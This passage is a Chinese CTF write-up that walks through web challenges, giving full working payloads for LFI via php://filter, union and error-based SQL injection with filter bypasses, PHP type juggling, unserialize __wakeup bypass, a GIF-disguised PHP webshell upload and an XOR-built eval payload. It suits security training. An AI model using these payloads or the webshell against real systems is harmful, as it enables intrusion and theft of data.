class="line">flag&#123;c39d07f5-6b36-4255-b98b-9a66c7144c05&#125;</span><br></pre></td></tr></table></figure><h3 id="Havefun"><a href="#Havefun" class="headerlink" title="Havefun"></a>Havefun</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>这题给了个很萌的网页，观察了一会儿网页上的猫之后，没思路的我看了一手网页源代码。发现了这样一段代码被注释掉了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cat</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cat&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$cat</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$cat</span> == <span class="string">&#x27;dog&#x27;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Syc&#123;cat_cat_cat_cat&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所以顺势给了网页一个参数 <code>cat=dog</code> 之后，flag 就出现在了网页上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a84da6ed-7606-45b4-b97e-12e6d57e8819&#125;</span><br></pre></td></tr></table></figure><h3 id="Secret-File"><a href="#Secret-File" class="headerlink" title="Secret File"></a>Secret File</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">302</span><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">PHP 伪协议</span></p><p>一开始看到题目还以为是文件上传啥的，点进去是个红配黑的界面。查看一手源码之后可以跳转两次，但是第二次跳转的时候直接提示“查阅完毕”。反复两次之后发现链接被跳转了，于是猜测中间的 <code>action.php</code> 有点东西。于是上了一手 Python，带上 <code>allow_redirects=False</code> 的参数跑了一波 request，然后成功拿到了夹在跳转中间的 <code>secr3t.php</code>。很骚的是这个页面打开是一段 PHP 代码。（？代码审计）一开始我没管，直接照着提示去了<code>flag.php</code>，然后没有成功拿到 flag。</p><p>推测要从  <code>secr3t.php</code> 这里想办法直接输出 PHP 文件。正好之前看过的视频里面讲到过 <code>filter</code> 和 <code>php://</code>。于是回去仔细看了一手那段 PHP 代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(strstr(<span class="variable">$file</span>,<span class="string">&quot;../&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;input&quot;</span>) || stristr(<span class="variable">$file</span>,<span class="string">&quot;data&quot;</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Oh no!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br><span class="line"><span class="comment">//flag放在了flag.php里</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后照着之前的葫芦画了个这样的瓢 <code>.../secr3t.php?file=php://filter/read=convert.base64-encode/resource=flag.php</code> 然后成功拿到了一长串 base64 编码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PCFET0NUWVBFIGh0bWw+Cgo8aHRtbD4KCiAgICA8aGVhZD4KICAgICAgICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgICAgICAgPHRpdGxlPkZMQUc8L3RpdGxlPgogICAgPC9oZWFkPgoKICAgIDxib2R5IHN0eWxlPSJiYWNrZ3JvdW5kLWNvbG9yOmJsYWNrOyI+PGJyPjxicj48YnI+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPGgxIHN0eWxlPSJmb250LWZhbWlseTp2ZXJkYW5hO2NvbG9yOnJlZDt0ZXh0LWFsaWduOmNlbnRlcjsiPuWViuWTiO+8geS9oOaJvuWIsOaIkeS6hu+8geWPr+aYr+S9oOeci+S4jeWIsOaIkVFBUX5+fjwvaDE+PGJyPjxicj48YnI+CiAgICAgICAgCiAgICAgICAgPHAgc3R5bGU9ImZvbnQtZmFtaWx5OmFyaWFsO2NvbG9yOnJlZDtmb250LXNpemU6MjBweDt0ZXh0LWFsaWduOmNlbnRlcjsiPgogICAgICAgICAgICA8P3BocAogICAgICAgICAgICAgICAgZWNobyAi5oiR5bCx5Zyo6L+Z6YeMIjsKICAgICAgICAgICAgICAgICRmbGFnID0gJ2ZsYWd7ZjNhOTMxZDAtODU3OS00NGJiLThiODctMjYxODRiYWZmYzlkfSc7CiAgICAgICAgICAgICAgICAkc2VjcmV0ID0gJ2ppQW5nX0x1eXVhbl93NG50c19hX2cxcklmcmkzbmQnCiAgICAgICAgICAgID8+CiAgICAgICAgPC9wPgogICAgPC9ib2R5PgoKPC9odG1sPgo=</span><br></pre></td></tr></table></figure><p>解码之后是这样的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">        &lt;title&gt;FLAG&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">    &lt;body style&#x3D;&quot;background-color:black;&quot;&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;h1 style&#x3D;&quot;font-family:verdana;color:red;text-align:center;&quot;&gt;啊哈！你找到我了！可是你看不到我QAQ~~~&lt;&#x2F;h1&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">        </span><br><span class="line">        &lt;p style&#x3D;&quot;font-family:arial;color:red;font-size:20px;text-align:center;&quot;&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">                echo &quot;我就在这里&quot;;</span><br><span class="line">                $flag &#x3D; &#39;flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;&#39;;</span><br><span class="line">                $secret &#x3D; &#39;jiAng_Luyuan_w4nts_a_g1rIfri3nd&#39;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;&#x2F;p&gt;</span><br><span class="line">    &lt;&#x2F;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>成功拿到 flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;f3a931d0-8579-44bb-8b87-26184baffc9d&#125;</span><br></pre></td></tr></table></figure><h3 id="LoveSQL"><a href="#LoveSQL" class="headerlink" title="LoveSQL"></a>LoveSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>一如既往熟悉的界面，随手输了个 <code>admin' #</code> 就登进去了，但是除了一行字啥也没有 <code>Your password is 'fbc72bd807fe8419b27393707199b18e'</code>。于是退回去试了一波常规操作，构造一个这样的 payload <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(table_name)%2C3%20from%20information_schema.tables%20where%20table_schema=database()%20%23&password=123</code> 成功爆出了表。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello geekuser,l0ve1ysq1！</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure><p>于是继续常规操作，<code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(column_name)%2C3%20from%20information_schema.columns%20where%20table_schema=database()%20%23&password=123</code> 成功爆出列。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello id,username,password,id,username,password！</span><br></pre></td></tr></table></figure><p>到这里我懵了一会儿，他没有 flag 啥的列，我还以为找错地方了。后来试了试 password 发现我想多了。用 <code>.../check.php?username=nullnull%27%20union%20select%201%2Cgroup_concat(password)%2C3%20from%20l0ve1ysq1%20%23&password=123</code> 成功拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e3d9d46f-a313-45bf-86b8-31b46fa246ce&#125;</span><br></pre></td></tr></table></figure><h3 id="Http"><a href="#Http" class="headerlink" title="Http"></a>Http</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Headers</span></p><p>这题的网页设计终于好看写了OwO  上来没看到啥，所以就看了一手源码，找到了 <code>Secret.php</code>。直接访问一波，然后跟着各种提示，添加如下 header。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: localhost</span><br><span class="line">User-Agent: Syclover</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.Sycseret.com</span><br></pre></td></tr></table></figure><p>访问之后成功拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;39ca0d2c-d886-456e-ad91-98f1bf1fe95c&#125;</span><br></pre></td></tr></table></figure><h3 id="BabySQL"><a href="#BabySQL" class="headerlink" title="BabySQL"></a>BabySQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>依旧是熟悉的配方，上手拿着上次的 payload 试了一手，发现报错了，然后换了个简单的 <code>.../check.php?username=nullnull%27%20or%201=1%20%23&password=123</code> 依旧报错了。仔细看看报错，发现我语句里的 <code>or</code> 没了。查了一波资料，得知可以双写关键字来绕过过滤。于是试了一手 <code>.../check.php?username=nullnull%27%20oorr%201=1%20%23&password=123</code> 发现登录成功了。于是照着前面的 payload 双写关键字。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(table_name)%2C3%20frfromom%20infoorrmation_schema.tables%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello b4bsql,geekuser！</span><br><span class="line">Your password is &#39;3&#39;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...&#x2F;check.php?username&#x3D;nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(column_name)%2C3%20frfromom%20infoorrmation_schema.columns%20whwhereere%20table_schema&#x3D;database()%20%23&amp;password&#x3D;123</span><br><span class="line"></span><br><span class="line">Hello id,username,password,id,username,password！</span><br><span class="line">Your password is &#39;3&#39;</span><br></pre></td></tr></table></figure><p>最后用 <code>.../check.php?username=nullnull%27%20ununionion%20selselectect%201%2Cgroup_concat(passwoorrd)%2C3%20frfromom%20b4bsql%20%23&password=123</code> 成功拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;e53f0586-f83e-4183-8dba-c12dc4a84383&#125;</span><br></pre></td></tr></table></figure><h3 id="HardSQL"><a href="#HardSQL" class="headerlink" title="HardSQL"></a>HardSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>这题用老套路上去就被怼“臭弟弟”了，试了一手，发现大部分关键字好像还在，但是空格啥的符号都没了， <code>union</code> 这个关键字也没了。于是就想着走报错注入的思路了。</p><p>一开始疯狂报错（没用的那种），然后去补了一波报错注入的知识点。然后整了个简单的试了试 <code>.../check.php?username=admin%27or(updatexml(1,concat(user(),0x7e,version()),1))%23&password=123</code> 然后发现有了回显 <code>XPATH syntax error: '@localhost~10.3.18-MariaDB'</code>。于是照着整了个爆表的 payload <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=123</code> 成功拿到表 <code>H4rDsq1</code>。</p><p>依照套路，用 <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_schema)like(database())),0x7e),1))%23&password=123</code> 成功拿到列 <code>id,username,password</code>。</p><p>最后，用 <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e),1))%23&password=123</code> 拿到了半个 flag <code>flag&#123;128c8f16-6d62-4b41-b632-ba</code>  （<del>搞人心态成功</del>）</p><p>再次查了一波，用个 <code>right()</code> 拿到了另一半， <code>.../check.php?username=<br>admin%27or(updatexml(1,concat(0x7e,(select(right(group_concat(password),20))from(H4rDsq1)),0x7e),1))%23&password=123</code>。最后拼接起来，成功拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;128c8f16-6d62-4b41-b632-ba18b718684a&#125;</span><br></pre></td></tr></table></figure><h3 id="BuyFlag"><a href="#BuyFlag" class="headerlink" title="BuyFlag"></a>BuyFlag</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #103f91;color: #fff;font-size: 0.75rem;margin-right: 5px;">Cookie</span><span style="padding: 0.25rem 0.375rem;background-color: #641790;color: #fff;font-size: 0.75rem;margin-right: 5px;">POST &amp; GET Trick</span></p><p>这题上来给了个很像 Http 那题的网页，于是就看了一手源码，成功找到入口 <code>pay.php</code>。进去之后依旧没什么头绪——完全没有可以输入的地方。倒是网页本身给了不少提示，于是看了一手源码，发现了一段注释。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">if (is_numeric($password)) &#123;</span><br><span class="line">echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p>于是构造了一个参数 <code>password=404%250</code> ，POST 过去之后好像没啥反应。其实是它的 Cookie 里还有点东西，把 Cookie 的 <code>user:0</code> 改成 <code>user:1</code> 之后出现了新的提示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you are Cuiter</span><br><span class="line">Password Right!</span><br><span class="line">Pay for the flag!!!hacker!!!</span><br></pre></td></tr></table></figure><p>于是接着构造 POST 的参数 <code>money=1000000000</code> ，结果得到了数字过长的提示 <code>Nember lenth is too long</code> 。到这个地方我突然有点迷了，于是去问了<a href="https://duitutu.cn">堆堆</a>，结果他说他猜出来这是 strcmp 的漏洞（我真的猜不出），于是构造一波参数 <code>money[]=1</code> 。<span class="HighlightWKT7BlueGreen">这个地方用科学计数法也可以构造，写作 <code>money=1e9</code> ，这样解释更加好一些。</span>（via <a href="https://duitutu.cn">堆堆</a>）</p><p>最后用 <code>password=404%250&money[]=1</code> 的参数成功拿到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;40e309cf-6975-439d-912d-0c66009cd05e&#125;</span><br></pre></td></tr></table></figure><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Source Leak</span><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Unserialize</span></p><p>打开之后看到了一只猫猫，可以用鼠标操控毛线球逗它玩，页面上方还有“备份”的提示。于是咱用 wwwscan 扫描了一下，顺利下载到了 <code>.../<a href="http://www.zip/">www.zip</a></code>。看了一下文件，发现以下主要代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="variable">$select</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;select&#x27;</span>];</span><br><span class="line"><span class="variable">$res</span>=unserialize(@<span class="variable">$select</span>);</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//class.php</span></span><br><span class="line">...</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&#x27;guest&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You name is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;username;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;You password is: &quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;password;<span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;username === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can&#x27;t give you the flag!&quot;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>很明显这里考了一个反序列化的操作，我把他的代码稍作修改，看了一下序列化的结果。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> serialize(<span class="keyword">new</span> Name(<span class="string">&#x27;admin&#x27;</span>,<span class="number">100</span>));</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Name</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span> = <span class="string">&#x27;nonono&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span> = <span class="string">&#x27;yesyes&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="variable">$username</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;password != <span class="number">100</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出的结果是 <code>O:4:"Name":2:&#123;s:14:" Name username";s:5:"admin";s:14:" Name password";i:100;&#125;</code>。因为还要绕过 <code>__wakeup()</code>，所以要把上述输出的 2 改成 3 或者一个更大的数。然后因为 username 和 password 都是私有成员，所以把类名和成员名前面以空格输出的 null 字符换成 \0。</p><p>最后将请求 url 拼接起来 <code>.../?select=O:4:"Name":2:&#123;s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;&#125;</code>。使用 Python 的 Requests 库访问，成功拿到 flag。（我也不知道为什么直接 HackBar 访问不显示 flag）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14414a53-1fe9-4623-a67b-07b581d4bbcb&#125;</span><br></pre></td></tr></table></figure><h3 id="Knife"><a href="#Knife" class="headerlink" title="Knife"></a>Knife</h3><p>这题很明显地提示了使用一波菜刀，于是果断用菜刀连上去。一开始用菜刀的文件管理找了很久，并没有找到 flag。于是就打开了一波虚拟终端，整了一波 <code>find / -name flag</code>。在一堆 Permission Denied 刷过之后找到了 <code>/flag</code>。然后执行一波 <code>cat /flag</code> 就成功地拿到了 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3d1c3437-1ea2-45ea-9660-5d304e2b43c5&#125;</span><br></pre></td></tr></table></figure><h3 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">Upload</span></p><p>打开之后是个朴素的上传界面，首先随便写了句 <code>phpinfo</code> 伪装成 png 传上去，结果提示不能含有字符 <code>&lt;?</code>，于是果断换了一种只有 php 5.x 可以执行的格式（事实证明还是管的），但是依旧被识别了。一番查找之后在文件头部加上了 <code>GIF89a?</code> 成功过掉这一个点。结果在改拓展名的时候又失败了，提示不能用 <code>.php</code> 拓展名。搜索了一波发现可以用 <code>.phtml</code> 这个后缀。于是一番修改之后，“图片”传了上去，一句话木马得以执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">&quot;php&quot;</span>&gt;</span><span class="javascript"><span class="built_in">eval</span>($_POST[<span class="string">&#x27;Citrone&#x27;</span>])</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>用菜刀连上之后，进虚拟终端里直接 <code>cat /flag</code> 就能得到 flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;14129955-5097-4e0d-91ff-b200f9a11b5d&#125;</span><br></pre></td></tr></table></figure><h3 id="RCE-ME"><a href="#RCE-ME" class="headerlink" title="RCE ME"></a>RCE ME</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">RCE</span><span style="padding: 0.25rem 0.375rem;background-color: #b8391a;color: #fff;font-size: 0.75rem;margin-right: 5px;">AntSword</span></p><p>题目一开始就给了段很顶的代码，直接把字母数字都过滤了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// <span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>一番查找之下找到了神奇操作，通过其他字符的异或得到字母和数字来构造指令。<a href="https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html">原理参考</a> 于是我当即用可以使用的各种字符相互异或打了个表，然后筛选出了可构成字母和数字的组合。然后照着构造了  <code>code=$_=%27`&#123;&#123;&#123;%27^%27?%3C%3E/%27;$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&_=assert&__=eval($_POST[%22l%22])</code> 这个 payload，成功连上。但是因为过滤了太多东西，导致终端命令几乎没法执行。</p><p>在一番查询之后找到了蚁剑，辗转在 Kali Linux 装上之后用上了 bypass disable 的插件，然后成功执行了 <code>readflag</code> 读取到了flag。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;b4c4e9fb-ea8c-4351-98e1-b1e8e5794411&#125;</span><br></pre></td></tr></table></figure><h3 id="FinalSQL"><a href="#FinalSQL" class="headerlink" title="FinalSQL"></a>FinalSQL</h3><p><span style="padding: 0.25rem 0.375rem;background-color: #185c37;color: #fff;font-size: 0.75rem;margin-right: 5px;">SQL Injection</span></p><p>这题其实需要一点仔细的观察，跟之前开门见山的注入点有点不一样，给出的账号和密码的框并不是注入的地方。点完五个按钮可以拿到“第六个按钮”的暗示，于是看了一手源码，发现有一行代码被注释掉了，取消注释发现了一个框，请求是 <code>../search.php?id=</code>，也就是那几个按钮的 ID。所有的结果都出现过了，其实一开始我是没有思路的，后来被提醒了这波是盲注，于是就构造了个 